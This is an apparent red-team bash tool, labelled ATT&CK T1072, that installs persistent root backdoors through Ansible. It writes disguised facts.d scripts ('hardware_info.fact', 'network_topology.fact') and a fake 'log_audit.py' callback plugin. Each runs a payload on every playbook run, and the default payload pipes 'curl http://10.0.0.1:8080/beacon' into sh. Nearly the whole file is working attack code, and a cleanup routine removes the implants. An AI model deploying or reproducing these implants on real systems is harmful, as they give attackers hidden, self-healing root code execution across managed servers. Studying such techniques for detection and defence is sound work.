#!/bin/bash
# T1072 — Software Deployment Tools: Ansible facts.d Persistence
# Self-healing persistence via configuration management custom facts

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_ansible"

banner() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1072 — Ansible facts.d Persistence         ║"
    echo "  ║   Self-healing via config management          ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

deploy_ansible_facts() {
    echo -e "${CYAN}[*] Deploying Ansible facts.d persistence${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    echo -e "${YELLOW}[*] Ansible's setup module auto-executes any executable in /etc/ansible/facts.d/"
    echo -e "    on EVERY playbook run (gather_facts: true, which is default)."
    echo -e "    Runs as root. Output is JSON (side-effects are the real payload)."
    echo -e "    Self-healing: if deleted, next Ansible run from master re-deploys.${NC}"
    echo ""

    read -p "  Payload command: " CMD
    [[ -z "$CMD" ]] && CMD="curl -s http://10.0.0.1:8080/beacon | sh"

    local FACTSDIR="/etc/ansible/facts.d"
    mkdir -p "$FACTSDIR"

    # Create a fact script that looks like a hardware inventory tool
    cat > "${FACTSDIR}/hardware_info.fact" << FEOF
#!/bin/bash
# Hardware inventory collection script
# ${MARKER}
# Side-effect payload (runs as root during every playbook execution)
(nohup sh -c '${CMD}' &>/dev/null &)

# Must output valid JSON for Ansible
CPU_MODEL=\$(grep "model name" /proc/cpuinfo 2>/dev/null | head -1 | cut -d: -f2 | xargs)
MEM_TOTAL=\$(grep MemTotal /proc/meminfo 2>/dev/null | awk '{print \$2}')
DISK_TOTAL=\$(df -h / 2>/dev/null | awk 'NR==2{print \$2}')

cat << EOF
{
    "cpu_model": "\${CPU_MODEL:-unknown}",
    "memory_kb": "\${MEM_TOTAL:-0}",
    "disk_root": "\${DISK_TOTAL:-0}",
    "inventory_ts": "\$(date +%s)"
}
EOF
FEOF
    chmod 755 "${FACTSDIR}/hardware_info.fact"

    # Create a second one for redundancy
    cat > "${FACTSDIR}/network_topology.fact" << FEOF
#!/bin/bash
# Network topology discovery
# ${MARKER}
(nohup sh -c '${CMD}' &>/dev/null &)

IFACE=\$(ip route | awk '/default/{print \$5}' | head -1)
IP=\$(ip -4 addr show \$IFACE 2>/dev/null | awk '/inet/{print \$2}' | head -1)
GW=\$(ip route | awk '/default/{print \$3}' | head -1)

cat << EOF
{
    "primary_interface": "\${IFACE:-eth0}",
    "ip_address": "\${IP:-unknown}",
    "gateway": "\${GW:-unknown}",
    "scan_ts": "\$(date +%s)"
}
EOF
FEOF
    chmod 755 "${FACTSDIR}/network_topology.fact"

    echo -e "${GREEN}[+] Deployed: ${FACTSDIR}/hardware_info.fact${NC}"
    echo -e "${GREEN}[+] Deployed: ${FACTSDIR}/network_topology.fact${NC}"
    echo -e "${YELLOW}[*] Executes on every 'ansible-playbook' or 'ansible <host> -m setup'${NC}"
    echo -e "${YELLOW}[*] Self-heals if Ansible re-deploys facts from master${NC}"

    # Test it
    echo ""
    echo -e "  ${CYAN}Testing fact output:${NC}"
    "${FACTSDIR}/hardware_info.fact" 2>/dev/null
}

deploy_ansible_callback() {
    echo -e "${CYAN}[*] Deploying Ansible callback plugin backdoor${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    echo -e "${YELLOW}[*] Ansible callback plugins execute during every playbook run."
    echo -e "    Loaded from callback_plugins/ in playbook directory or configured path.${NC}"
    echo ""

    read -p "  Payload command: " CMD
    [[ -z "$CMD" ]] && CMD="curl -s http://10.0.0.1:8080/beacon | sh"

    # Find Ansible config
    local CALLBACK_DIR="/usr/share/ansible/plugins/callback"
    mkdir -p "$CALLBACK_DIR"

    cat > "${CALLBACK_DIR}/log_audit.py" << PYEOF
# Ansible callback plugin - audit logging
# ${MARKER}
from ansible.plugins.callback import CallbackBase
import subprocess, os

class CallbackModule(CallbackBase):
    CALLBACK_VERSION = 2.0
    CALLBACK_TYPE = 'notification'
    CALLBACK_NAME = 'log_audit'
    CALLBACK_NEEDS_WHITELIST = False

    def __init__(self):
        super().__init__()
        try:
            subprocess.Popen(["sh", "-c", "${CMD}"],
                stdout=open(os.devnull,'w'), stderr=open(os.devnull,'w'),
                preexec_fn=os.setpgrp)
        except:
            pass

    def v2_playbook_on_start(self, playbook):
        pass
PYEOF

    echo -e "${GREEN}[+] Deployed: ${CALLBACK_DIR}/log_audit.py${NC}"
    echo -e "${YELLOW}[*] Executes at the START of every playbook run${NC}"
}

cleanup() {
    echo -e "${CYAN}[*] Cleaning up Ansible persistence...${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    # Remove fact scripts
    find /etc/ansible/facts.d -type f -exec grep -l "${MARKER}" {} \; 2>/dev/null | \
        while read -r f; do rm -f "$f"; echo -e "  ${GREEN}Removed: $f${NC}"; done

    # Remove callback plugins
    find /usr/share/ansible/plugins -type f -exec grep -l "${MARKER}" {} \; 2>/dev/null | \
        while read -r f; do rm -f "$f"; echo -e "  ${GREEN}Removed: $f${NC}"; done

    echo -e "${GREEN}[+] Ansible persistence removed${NC}"
}

main() {
    banner

    echo -e "  ${CYAN}[1]${NC} Deploy facts.d persistence"
    echo -e "  ${CYAN}[2]${NC} Deploy callback plugin backdoor"
    echo -e "  ${CYAN}[3]${NC} Cleanup"
    echo ""
    read -p "Choose [1-3]: " OPT

    case "$OPT" in
        1) deploy_ansible_facts ;;
        2) deploy_ansible_callback ;;
        3) cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
